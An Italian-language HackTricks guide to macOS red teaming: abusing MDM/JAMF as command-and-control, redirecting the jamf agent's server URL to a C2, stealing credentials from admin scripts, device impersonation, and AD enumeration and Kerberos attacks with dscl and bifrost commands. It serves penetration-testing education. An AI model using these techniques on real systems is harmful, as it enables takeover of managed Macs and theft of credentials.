# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## Abuso degli MDM

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Se riesci a **compromettere le credenziali di amministratore** per accedere alla piattaforma di gestione, puoi **potenzialmente compromettere tutti i computer** distribuendo il tuo malware sui dispositivi.

Per il red teaming negli ambienti macOS, è altamente consigliato avere una certa conoscenza del funzionamento degli MDM:


{{#ref}}
macos-mdm/
{{#endref}}

### Usare un MDM come C2

Un MDM avrà l'autorizzazione per installare, interrogare o rimuovere profili, installare applicazioni, creare account di amministratore locale, impostare la password del firmware, modificare la chiave FileVault...

Per eseguire un MDM autonomo, devi far **firmare il tuo CSR da un vendor**; puoi provare a farlo tramite [**https://mdmcert.download/**](https://mdmcert.download/). Per eseguire un MDM autonomo per dispositivi Apple, puoi usare [**MicroMDM**](https://github.com/micromdm/micromdm).

L'iscrizione a un MDM **non** rende automaticamente attendibile l'autorità di certificazione del certificato TLS del server di gestione, né concede un'identità per la firma delle app. Se il server usa una CA privata, i certificati radice e intermedi devono essere forniti nel profilo di iscrizione o in un profilo di attendibilità separato. Il certificato client usato per l'autenticazione MDM è un certificato diverso.<sup>[[7]](#references)</sup>

Un profilo di iscrizione MDM scaricato (`.mobileconfig`) deve essere aperto e approvato in **Impostazioni di Sistema → Generali → Gestione dispositivo**. Inserirlo semplicemente in un `.pkg` installato con privilegi di root o in uno ZIP aperto con Safari non iscrive automaticamente un Mac recente. Vedi [comportamento dei profili di configurazione](../macos-auto-start-locations.md#configuration-profiles-mobileconfig).<sup>[[8]](#references)</sup>

L'iscrizione automatica dei dispositivi durante Setup Assistant è un flusso separato. Vedi [iscrizione fraudolenta di un dispositivo appartenente a un'altra organizzazione](macos-mdm/enrolling-devices-in-other-organisations.md) per i relativi prerequisiti.<sup>[[9]](#references)</sup>

L'agente Mythic Orthrus usa questa tecnica.

### Distribuire un pacchetto tramite un MDM controllato

Su un **Mac supervisionato con macOS 26 o versioni successive**, il controllo del servizio MDM consente di usare una dichiarazione `com.apple.configuration.package` nell'ambito di sistema.<sup>[[10]](#references)</sup> Il pacchetto deve avere una firma verificabile dal dispositivo, ma la sua app non necessita di una firma Developer ID separata: Gatekeeper non controlla le app installate tramite la gestione dei dispositivi.<sup>[[11]](#references)</sup> Il solo fatto di avere un certificato TLS del server attendibile non fornisce all'operatore la chiave privata o l'uso di firma necessari per firmare il pacchetto.<sup>[[11]](#references)[[12]](#references)</sup>

Crea un pacchetto di test firmato, calcolane il digest e pubblica sia il pacchetto sia un plist `ManifestURL` tramite HTTPS. Il manifest deve contenere un asset `software-package` con il relativo URL e SHA-256, oltre a un `bundle-identifier` e un `bundle-version` univoci.<sup>[[11]](#references)</sup> Invia quindi una dichiarazione del pacchetto con l'URL del manifest e `InstallBehavior.Install` impostato su `Required`; controlla l'elemento di stato `package.list` per verificare l'installazione o eventuali errori.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
pkgbuild --component ./Test.app --install-location /Applications --sign "Package Signing Certificate" ./Test.pkg
shasum -a 256 ./Test.pkg
```

Una dichiarazione minima di installazione obbligatoria, inviata tramite il servizio MDM, è simile a questa (sostituire l'URL e entrambi gli UUID).<sup>[[10]](#references)</sup>

```json
{
  "Type": "com.apple.configuration.package",
  "Identifier": "11111111-1111-4111-8111-111111111111",
  "ServerToken": "22222222-2222-4222-8222-222222222222",
  "Payload": {
    "ManifestURL": "https://mdm.example.org/TestPackage.plist",
    "InstallBehavior": {"Install": "Required"}
  }
}
```

### Abuso di JAMF PRO

JAMF può eseguire **script personalizzati** (script sviluppati dall'amministratore di sistema), **payload nativi** (creazione di account locali, impostazione della password EFI, monitoraggio di file/processi...) e **MDM** (configurazioni dei dispositivi, certificati dei dispositivi...).<sup>[[5]](#references)</sup>

#### Auto-registrazione JAMF

Visita una pagina come `https://<company-name>.jamfcloud.com/enroll/` per verificare se è **abilitata l'auto-registrazione**. Se lo è, potrebbe **chiederti le credenziali per accedere**.

Puoi usare lo script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) per eseguire un password spraying attack.

Inoltre, dopo aver trovato credenziali valide, potresti riuscire a eseguire un brute-force su altri nomi utente usando il modulo seguente:

![Abuso di JAMF PRO - Auto-registrazione JAMF: Inoltre, dopo aver trovato credenziali valide, potresti riuscire a eseguire un brute-force su altri nomi utente usando il modulo seguente](<../../images/image (107).png>)

#### Autenticazione dei dispositivi JAMF

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Il binario **`jamf`** conteneva il segreto per aprire il portachiavi che, al momento della scoperta, era **condiviso** con tutti; il segreto era: **`jk23ucnq91jfu9aj`**.<sup>[[5]](#references)</sup>\
Inoltre, jamf mantiene la persistenza come **LaunchDaemon** in **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Compromissione dei dispositivi JAMF

L'**URL** del **JSS** (Jamf Software Server) utilizzato da **`jamf`** si trova in **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Questo file contiene essenzialmente l'URL:

```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
	<key>is_virtual_machine</key>
	<false/>
	<key>jss_url</key>
	<string>https://subdomain-company.jamfcloud.com/</string>
	<key>last_management_framework_change_id</key>
	<integer>4</integer>
[...]
```

Quindi, un attaccante potrebbe distribuire un pacchetto malevolo (`pkg`) che **sovrascrive questo file** durante l’installazione, impostando l’URL di un listener C2 Mythic tramite un agent Typhon, così da poter abusare di JAMF come C2.

```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```

#### Impersonazione JAMF

Per **impersonare la comunicazione** tra un dispositivo e JMF, servono:

- lo **UUID** del dispositivo: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- il **keychain JAMF** in `/Library/Application\ Support/Jamf/JAMF.keychain`, che contiene il certificato del dispositivo

Con queste informazioni, **crea una VM** con l'**UUID** hardware **rubato** e con **SIP disabilitato**, inserisci il **keychain JAMF**, fai **hook** dell'**agent** Jamf e rubane le informazioni.

#### Furto di segreti

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Puoi anche monitorare il percorso `/Library/Application Support/Jamf/tmp/` per individuare gli **script personalizzati** che gli amministratori potrebbero voler eseguire tramite Jamf: vengono **inseriti qui, eseguiti e rimossi**. Questi script **potrebbero contenere credenziali**.

Tuttavia, le **credenziali** potrebbero essere passate a questi script come **parametri**, quindi dovresti monitorare `ps aux | grep -i jamf` (anche senza essere root).

Lo script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) può rilevare i nuovi file aggiunti e gli argomenti dei nuovi processi.

### Accesso remoto a macOS

E anche i protocolli di rete "speciali" di **MacOS**:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

In alcuni casi scoprirai che il **computer MacOS è connesso a un AD**. In questo scenario, dovresti provare a **enumerare** Active Directory come sei abituato a fare. Trovi alcuni **suggerimenti** nelle pagine seguenti:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Un **tool locale per MacOS** che potrebbe esserti utile è `dscl`:

```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```

Inoltre, sono disponibili alcuni strumenti per MacOS che consentono di enumerare automaticamente AD e interagire con Kerberos:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound è un'estensione dello strumento di auditing Bloodhound che consente di raccogliere e acquisire le relazioni di Active Directory dagli host MacOS.<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost è un progetto Objective-C progettato per interagire con le API Heimdal krb5 su macOS. L'obiettivo del progetto è consentire test di sicurezza più efficaci su Kerberos nei dispositivi macOS, usando API native senza richiedere altri framework o pacchetti sul target.
- [**Orchard**](https://github.com/its-a-feature/Orchard): strumento JavaScript for Automation (JXA) per enumerare Active Directory.

### Informazioni sul dominio

```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```

### Utenti

I tre tipi di utenti MacOS sono:

- **Utenti locali** — Gestiti dal servizio OpenDirectory locale, non sono in alcun modo collegati ad Active Directory.
- **Utenti di rete** — Utenti volatili di Active Directory che richiedono una connessione al server DC per autenticarsi.
- **Utenti mobili** — Utenti di Active Directory con un backup locale delle credenziali e dei file.

Le informazioni locali su utenti e gruppi sono memorizzate nella cartella _/var/db/dslocal/nodes/Default._\
Ad esempio, le informazioni sull'utente chiamato _mark_ sono memorizzate in _/var/db/dslocal/nodes/Default/users/mark.plist_ e quelle sul gruppo _admin_ in _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Oltre a usare gli archi HasSession e AdminTo, **MacHound aggiunge tre nuovi archi** al database Bloodhound:<sup>[[2]](#references)</sup>

- **CanSSH** - entità autorizzata a usare SSH per connettersi all'host
- **CanVNC** - entità autorizzata a usare VNC per connettersi all'host
- **CanAE** - entità autorizzata a eseguire script AppleEvent sull'host

```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```

Ulteriori informazioni in [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)<sup>[[3]](#references)[[6]](#references)</sup>

### Computer$ password

Ottieni le password usando:

```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```

È possibile accedere alla password **`Computer$`** nel portachiavi System.

### Over-Pass-The-Hash

Ottieni un TGT per un utente e un servizio specifici:

```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
       --hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```

Una volta ottenuto il TGT, è possibile iniettarlo nella sessione corrente con:

```bash
bifrost --action asktgt --username test_lab_admin \
       --hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
       --enctype aes256 --domain test.lab.local
```

### Kerberoasting

```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
       --username [user] --hash [hash] --enctype [enctype]
```

Con i service ticket ottenuti è possibile provare ad accedere alle condivisioni su altri computer:

```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```

## Accesso al Keychain

È molto probabile che il Keychain contenga informazioni sensibili che, se vi si accede senza generare un prompt, potrebbero aiutare a portare avanti un'esercitazione di red team:


{{#ref}}
macos-keychain.md
{{#endref}}

## Servizi esterni

Il Red Teaming su MacOS è diverso dal normale Red Teaming su Windows, poiché **MacOS è solitamente integrato direttamente con diverse piattaforme esterne**. Una configurazione comune di MacOS prevede l'accesso al computer con **credenziali sincronizzate tramite OneLogin e l'accesso a diversi servizi esterni** (come github, aws...) tramite OneLogin.

## Tecniche di Red Team varie

### Safari

Quando si scarica un file con Safari, se è un file "sicuro", viene **aperto automaticamente**. Per esempio, se si **scarica uno zip**, questo viene decompresso automaticamente:<sup>[[1]](#references)</sup>

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>



## References

- [1] [Raccogliere mele: Red Teaming degli ambienti MacOS nel 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Presentazione di MacHound: una soluzione agli attacchi basati su Active Directory su macOS](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Comandi di enumerazione dei domini (equivalenti di dscl / net / ldapsearch)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Vieni al lato oscuro, abbiamo le mele: rendere malevola la gestione di macOS](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: "Una prospettiva degli attaccanti sulle configurazioni Jamf" - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
- [6] [Individuazione di Active Directory con un Mac - its-a-feature](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)
- [7] [Apple — Gestione dei certificati per i servizi di gestione dei dispositivi e i dispositivi](https://developer.apple.com/documentation/devicemanagement/managing-certificates-for-device-management-services-and-devices)
- [8] [Apple — Utilizzare i profili di configurazione su Mac](https://support.apple.com/en-gb/guide/mac-help/mh35561/mac)
- [9] [Apple — Distribuzione dei profili di iscrizione alla gestione dei dispositivi](https://developer.apple.com/documentation/devicemanagement/deploying-device-management-enrollment-profiles)
- [10] [Apple — Dichiarazione del pacchetto](https://developer.apple.com/documentation/devicemanagement/package)
- [11] [Apple — Installazione dei pacchetti](https://developer.apple.com/documentation/devicemanagement/installing-packages)
- [12] [Apple — Identità](https://developer.apple.com/documentation/security/identities)
{{#include ../../banners/hacktricks-training.md}}
